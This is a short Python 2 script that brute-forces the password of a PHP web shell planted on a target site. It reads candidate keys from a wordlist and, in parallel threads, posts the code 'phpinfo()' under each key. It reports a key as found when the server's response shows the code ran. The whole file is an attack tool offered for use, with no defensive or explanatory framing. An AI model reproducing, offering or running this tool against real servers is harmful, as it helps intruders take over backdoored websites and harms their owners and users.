import requests
import threading

def shellbp(url,key):
    try:
        post = {key:'phpinfo()'}
        r = requests.post(url,data=post)
        text = r.text
        i = text.find('phpinfo()')
        if i > 0:
            key = str(key)
            print "OK,key:"+key
    except:
        return
def main():
    url = raw_input("please input url:")
    password = open('./shellpwd.txt')
    for pwd in password.readlines():
        key = pwd.strip('\n')
        t = threading.Thread(target=shellbp,args=(url,key))
        t.start()
if __name__ == '__main__':
    main()
